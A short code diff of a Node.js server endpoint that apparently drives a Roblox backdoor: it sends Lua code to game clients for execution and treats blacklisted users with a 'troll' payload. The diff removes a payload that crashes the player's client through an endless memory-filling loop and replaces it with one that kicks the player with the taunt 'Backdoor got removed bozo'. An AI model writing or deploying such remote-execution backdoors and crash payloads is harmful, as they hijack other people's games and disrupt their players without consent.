@@ -23,14 +23,12 @@ app.post("/executeRequest", (req, res) => {
   console.log(`Execute request from: ${username}`);
 
   if (blacklist.has(username)) {
-    const trollPayload = `
+   const trollPayload = `
 if game:GetService("Players").LocalPlayer then
-    local t = {}
-    while true do
-        table.insert(t, t)
-    end
+    game:GetService("Players").LocalPlayer:Kick("Backdoor got removed bozo")
 end
-    `;
+`;
+
     events.emit(EVENT, { username, code: trollPayload });
     return res.sendStatus(200);
   }
